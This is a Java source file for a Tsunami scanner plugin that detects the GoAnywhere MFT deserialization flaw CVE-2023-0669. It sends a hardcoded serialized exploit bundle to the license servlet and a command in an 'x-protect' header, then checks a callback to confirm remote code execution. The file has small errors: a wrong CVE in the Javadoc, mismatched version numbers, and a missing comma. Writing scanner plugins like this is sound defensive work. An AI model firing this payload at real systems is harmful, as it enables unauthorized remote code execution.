package com.google.tsunami.plugins.detectors.goanywhere;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-0540 vulnerability. Reading */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    author = "SuperX (SuperX.SIR@proton.me)",
    name = "Cve20230669VulnDetector",
    version = "0.1",
    description =
        "GoAnywhere MFT up to version 7.11 suffers from a pre-authentication command injection vulnerability in the License "
            + "Response Servlet due to deserializing an arbitrary attacker-controlled object."
    bootstrapModule = Cve20230669DetectorBootstrapModule.class)
public class Cve20230669VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String LICENSE_URL = "goanywhere/lic/accept";
  private static final String COMMAND_HEADER = "x-protect";
  private final HttpClient httpClient;
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve20230669VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-0669 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    if (!payloadGenerator.isCallbackServerEnabled()) {
      logger.atInfo().log("Callback server disabled but required for this detector.");
      return false;
    }

    Payload payload = this.payloadGenerator.generate(config);
    String commandToInject = String.format("%s", payload.getPayload());
    String licenseUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + LICENSE_URL;

    String deserialized =
        "bundle=Jh88_jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS_fjlP7wTTEg2"
            + "-Jx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b_gYKBi2"
            + "-ny7fc2lOHNgalYV13mQzCTs0EgEUE9AuDUIMcFYx00pv4g4EOgEjeWbAx40rTtRby71AxapyXKy"
            + "-4XChDHVlPB1AV3njBKGWT6gHdPxT8hb75Ycrpjdk9EQ1HW4WJiz4uaVBu7hXm_Eag15IpIWgojFy4hst8"
            + "-q9YMms8Omq5lbdLabUHRcJAd6rLu6QrPLepYXQgGfMi_Qmj0qf5vXLfSX20cSBT_IEBlzzBR3lq_hiqrAfmZZCV3Y1HeMPpaMsmzL5zM1VTMX-5Pi5JGKMJ2Al2BZVZUUZQNqrcnueMVl1ZNhGMJ8eSFBCb4WGaNrhfgQ3sWUW3_A_ln_XwLi8z6XCOT5sJmFYZXBC4vYtY4leatX_o__lJHYPuA_TEmuEmEhIccj5Ou2xOvazmw9oXVUbM0vkPsb1UDyyTF0Ee85W0CUUCzb3rouvUDFaOZZLe08Z_Km2LgSq9Wr3fKojx_UevkOkOfwfiPlnJcQTRr45useRtOlHrJpP1iWSLi2vwK8bojMdCWzF13H8MmDjrJBCbcbChsXQkNcAJqkYa3y2SZXkwISRigFVLRnjDbyQLqLAzE0inCSf7NF9abKU5ZW8yMgF6NT802MJCz0gRJD6zLbFZSBYfGlzFJmu9-ZWYVywkwmu3xQrrA_tCRdqvd5zeHd3CgWOzBjOg55_iBNcPZOPYhMXD1ZEpPyG0CQpJfIUiblo4gGV0op-Mb2z5HIuvJ-l_YCxoYJi5RCdtgGoSmIo9wN59S0PeI6LI69EsoquDh7EA9Z7pc6XGk6rrbsJoFcV-lp_73dwmOH1U6pZRcEeMYgrB3n_R0BsoYHTika_iGEmmYv1CgBDfMlmVdQbtefAwh_AcJ9pyNACTwWdXQ0xmto3YYLbizDnmZ--NeiQ_534fTrGfjcIsbLgEnHcpG7Fwng72m7pHVy5LpurnRJXJyFBJW9IUF0vwH_UDZtAfeBK4kMbkuJrCTtQdyCks5SjfQWTArKeNGiKbGWReNhOnUnK8A2sxiYtvqlUi01mfOIfoc-9Lp6wXEBrNzWHH0zPWu4SNQmhR-JwmvFeIErraf83vz0_sRoU7IcSqKEF5zFjFF8n1oWqwBP5a3s_fKgbQ_UA74vmFh5cc_tlpBXS1oG8_EU5GAFI-woAA0Mlgkwmo-fGH1w1wB1LSOzgiT7r4QKDko55Timnwpk_D4RmXesvtu49-xyXcg4sL6NG5ujC6o5kKbTrwi7Vp8hjEx1v6nXeMfUbuWjYicH-ZIE_P_SMevvDUOQm3UZ67MbmdkReIR32TN_88A4J5dKN0QC08HLkYNSjsRp7XyXbSi5dZp3eQ6zkW9KuYU-S-NSBC9pV4arvsZXcwtWRTjweK49JIIgLMayI4y9TOjhg-LiwwzIlTY_t0KuzHSIYSw82LxmOeDhdQUC-sSOeV1G2sR095x3NDmfEfdvduTceU9cD3ofEFtedX5Z77aGFoVhdoG_hOjnYnaoaWYPe7JChYE0TZZfu3V7HF57X0cwoYYPDP6XzSf6kmxEWDoenYsPTmY_Evhqwp3Fhzko8_G-UR2tNH9JjIoouCEd8o8Gy7gnye2_u6wzCBuChv1yEug0miW8nSCQk69oHWeti94h1toBecBt70m8ySDHgL80vs4n5qHK2Mjv_eb3a5UrajOObvfoNMg_K85EudKBrdgW6bEV5KsZhFBDpDnxA7X8CHEHZiK4iDCFUCmSMCXQz7KqkHrcWh8l1ut7IPoxuiRhdI5wuNSw-xVmVwM1kJo5ahlOZcsARCNZ9NcAjcqojMDZjgkPo7lt-5Lrl2gPHg80YkNsfdB8Ao91vcZ6UuJ45ERB1G8V7TwxCMsHU8h8FFet1zb55rcBE-YJ5rvzaXif3OOFiS4MnA0LDszZkFJ4gW2SIMban79bz38yBnEz-au5l2SwkG7tY3DiKobiIz6ZJjOzVj2jAT7MsCpB8XNl8tCMYJHWErFrExXbosh-YvXoU8HCN_XALqBSZJyffqKu0iAYcyxc35QQl55ll-IybJU3Gu4LPGT6HXPlK3Hepmdd1ZhLzQG-adp465TzIDX-0YUK_Px-J0gmoW-kgUiGAVKrHIS4Qh-1E80u7GI_WUZTXSE7sgKUX-2qEUj6reo7Kf_4c_CZrwkA4RtoQrQMCs4Bs7dAft1eAqb9O-SDcW8kShwpUow3nz6PFKkdZ4SjYTNUjANTJT_7Yvzu-nHDPpEyriuZ4zcGKTadRgL2bbv1MwcTzJ1iCGMGXNk-sMiqOpqGdW_tAbfrGAuAjSiK5vCK4tO2xjR9qlMu9mzvC6FWXMlgoDFWbrXDSLUWWpgthJssAzniuX1iuGBlWmC7MzOCLQYyHKTIGDysqW4BgHQabqeXtqPoCLUCcCY8tlaACSFFe9ZQcQXgTHwClL5_TI2-9Cn5wIz28o-krld22hZ5KUWvXcW_278n6TxUJZPArM-KweuxdkzFYHjg1i8eZygMFz17MA9rUSTJzG7qvyXR_OIvI9EcGVP91noBQ2pN9zqFq7o81DRUmrNbNL1I4GPwK4kkLJVOJ1o6Hgw-zXmjeMveQII-aRzh-O2zZ9dpBJ8Yne7nWgeq1XAxW3A0lkqKr5hRbJD8najEI1xWvUEBHbPLD3oy4FGrs2Pegj7JlsGIwcmsQ8S_3bcp9ycdpNWXR0qgku3ltIZdFfW3Tnm-NFbfvkIRqmk8CaYsX2NlXGCJBLSt5HHioXDyUn1dRKvTpLx8aw41HqqGAACACvSWo0VLi4uXvxUZTgeA7q6BzH7KxptrTX62rBrU6R2ul5cgjTEYnakqcNUyJDjbxHBw1wY3k75erwfFj_pc6pE0PlB9zqIROk0yOiy2OWpg4KCAjryY1U0eOjnZVsoWjEuBT7Uvu0_9h04yZqToxRfu0WIODBLGJZ0lpx2bXtcaZPRFNwOFAeGHNpSY-ZO48bQR2Eo8kbB62w5DU6pKlFzCzK-bOzVvYUYDkYoQUSclOkW96M0hQ5DvJggB14AuXv0n4jsC1j_z4Yg1oeVnSbDA1PuGcAq8TovQX1KzpSHORoQFEhcclGxhc5-6kPt_cqImHd2C2UpYhVGEff3d2ShRzOETbELCR9w5OLY5EB4AxIOB9K4UUB-iqusjEmTYogjUUPhrHz1Dl88DD-W_QIR1fSpKDlCKWZXLWueZKXEFTKTIrWltCqbANJMPx5ww4Yo7jau6jZOPZWaZg_rApAJ4GhISBNRNUaRMUwRuKHrIaXBamJfkZXZNBJaUyv5uFXkCqkKlotr3JpOe8kBeFq_h-mmgM5G2pCK1LvnpIzXqMe1vPuR7om0ar4hRpV8aBlmhG9M7N2NQS50c-d96qKQQNDT_RgKslJfEPl4LuBie9IFlZ9qbpyq25XadMoDvDjuddAGb2jouTI8t1wXoK_fGMzUlPa7_Fq1yJqaeLF4gvoqZcEdocc0BZuM_8YqQGPhPRtxJ2wfnJ-9rdz58RNX8KoUnPEo7Y_GU5MqcmIsIqWgLkLHbFTytO9Xf2v90LKZoJy6vxfuD0C3ocGZ4syFrus4zZ0ydMU8L0b5A4Z9c4U7LE4kn79ujOBeseZDE1nAr2RL1c9ReAjJ6CLqpPYTihhLHglog64HMcxTGj1_fEnrNB53mzD0cw1UB5_kRE-Yr_JY0PRvYYGVfKfaXeklUVn3Rb-npVABFVQ6XrCN1dUFOhy4rUe3mZ3kyAXvjpXiRrkRnbKAk1c2ynLrIDetbNoQQGdIouuBEDX9NJIE9zKAttSQBpC5Xkoeu68oQcTU3IW_N848fuGIUsUl4oqO1wjNuG4TTBCCA82gu269_LCg5jB9JEa-DlhPzRwoGhJ4muc1ThgsINoLcevNu5iwP-ebUQfolW6ZdR3i12Eh9bZi3yiE7Sieb-dXx_qm5IrdlY0SZWKNC8OqlxVUzLaseMBE3kPrT-Dz6ClJXewCEU1vGYzPvKggCgg5clwEwsjGsOq7XYLGRJ9f5pMKZkcfO6-v4FpCk3fjHh0NDDZ8EE3i74a5fh1wVKsR2EJPpl6bEpWhMUDPtcavuTP7xbJC1sFDuLzoSE6qVXLbZFWPS6VMCEzkJ1-FxVsVE_WE4v72iygfLGZaOFgzyVOSEZAm8GThgHsxrKTb2_v5JcWLuock1Z6uva8P13htuNHACPZ3yhkXbuJ2b-6ucy2ZLurigtEDsNsmXsybmWdpS4vA6gnPDr5iSxVXz4BLyW0ShEbKLls_eJ_pH-y1b9Hw0KVVbcE05-bckumz7H-LwhcGVBsi2SKpoGSugH6gbX_fqrraMB0aC-0v6JIZ8WUNa7ElaMfJsE6XstjaE7KjXFHuhyQKeHgWKjm1oV8yLW7vRuqhs5RfWV3E09y2yASv_DY1WxMotFAqOHhz-zt3CiZCXQkPsjly3uHDKLrIjMYrHFvPPmQ8jD6AWiupBSVUi9yFnSFeZq8Ws3-Ki8JQEuWtMhCOsF5nBIb9NUifxO6sK2hUlbBVnhGV1PAz1FZ0tMHhFg7AVeviqUlePVASRtUQ-HmW9qPqH1UXiwysQAprepW6tHuExtYchRcla7ApOqUcQl1oCdQl6tsvn3ewlMTHvAyhUMjeap3yHlzUro-kFf-D285ircmCHRvoXgySqqZjO_8hkEcgBEWSp5Yn8xNZmw9PEthJzvAL2F6UfY58G_WrSIj5B-6GgHdgDVSzLiYSh_lrMFEd4QBtVYLz9KWlY5jjXxmN50RjWGhf2qx0iGrFC2ZnAwN6RxrB07Gl-nI2rAYVWoa_oIz_3s2rI7ll6fvzmdwKrSPNdcnG3MYVvTo8gAHrvhgFUje71_EgabRgOQv6XFCX6Vhsh9crycXjtISPU8ZWnf9tSQh-nUBplB2Go2WSmmLk1Rhu0deMsChn6dI7OQ-ed-36C_on1CY5bSuEkpJxxsNrcZTdmRG3KPlwHVcZ1kfFKlSTnFPjoOq1VLgLGuaOJFFiTerU2tbfj8rbgZbYOeZZToik7OirRjX_oTyKwHGQq5Y0d_W1Whwr8i5xK-V4HsdDOAOPv7NzL8-yxnL73kWP2357B_8yvUxHKjZ_ynyr--_ueBVZbOwnt4oBpbtsLh7_A6vo0MdBs2HpRRq8USpxlgN_s_2DNFRrxejgphOPDeHT-_mh7ey3lSZNMt3NU2M7lPWzWsffu5R5PXY9BxJT0PsUAgJS3i-sB5D4Fg7e4WiF83UroEYaz9mM0B-7VQ7hkqBgPEiDH2rZpUyhsG51TlYSbzb46g41vXdFpygqntOlEgBYkVbLwN3fIM9s2RL4908QD8o-ePuO-CnFL5KU5Yh7IcBx8a2FovJf07J7IoShuB2grZ7Uq8hwa5OJjZ0yN1pz1KsdT_OKONiiDiWvf67QRkrogsxA2PbFC4Qhr1ZwOnEO8fhZTFx_fdt5_z7RkjfObiDBNqGGY5iBnjxinzh67mODT_vohU7L3gPCkVnqcU2zUbiBsT-Xu0HGyQOPpBp5wS2QHln6GdmTkmARnSa4Mc1CU0x4YzmAoTU4v8xLCtucHHFHrYMB_MFJg_2rM_XxJVKjnU2ej7BFSbnyc_1XE12z9ca6dYywmwtTFtHSpJf-70SBU_nebcnTcUXMp2JTWdRUgGScybrwM4wGSYUq7THJqm297dQ9fJ9GjnWLOK3JQ7K2GjVWWmXKrlYlwKgx_3XDUUYErlZAw13_iQXLMZOUteWthVndxp9STpcQ";
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(licenseUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(
                              "Content-Type",
                              "application/x-www-form-urlencoded; " + "charset=UTF-8")
                          .addHeader(COMMAND_HEADER, commandToInject)
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(deserialized))
                  .build(),
              networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
    }
    return payload.checkIfExecuted();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2023-0669"))
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-0669"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-0669: GoAnywhere MFT RCE vulnerability")
                .setDescription(
                    "GoAnywhere MFT suffers from a pre-authentication command injection "
                        + "vulnerability in the License Response Servlet due to deserializing"
                        + " an arbitrary attacker-controlled object.All versions prior to 7.1.1 are affected")
                .setRecommendation(
                    "Update GoAnywhere MFT to a version that provides a fix 7.1.2 or later"))
        .build();
  }
}
